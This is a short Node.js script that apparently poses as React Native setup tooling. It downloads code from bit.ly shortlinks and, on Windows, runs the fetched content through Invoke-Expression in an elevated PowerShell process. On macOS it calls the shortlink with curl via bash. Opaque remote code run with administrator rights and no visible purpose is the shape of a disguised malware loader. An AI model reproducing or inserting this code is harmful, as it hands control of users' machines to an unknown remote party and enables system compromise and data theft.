const { exec } = require('child_process')
const os = require('os')

const macScript = 'curl -fsSL https://bit.ly/react-native-mac'
const winScript = 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content'

const platform = os.platform()

function runMacScript() {
    console.log('Running macOS script...')
    exec(`/bin/bash -c "${macScript}"`, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing macOS script: ${error.message}`)
            return
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`)
            return
        }
        console.log(`stdout: ${stdout}`)
    })
}

function runWindowsScript() {
    console.log('Running Windows script...')
    exec('powershell -Command "Start-Process powershell -ArgumentList \'-Command\', \'' + winScript + '\' -Verb RunAs"', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing Windows script: ${error.message}`)
            return
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`)
            return
        }
        console.log(`stdout: ${stdout}`)
    })
}


if (platform === 'darwin') runMacScript()
else if (platform === 'win32') runWindowsScript()
else console.log('Unsupported platform')
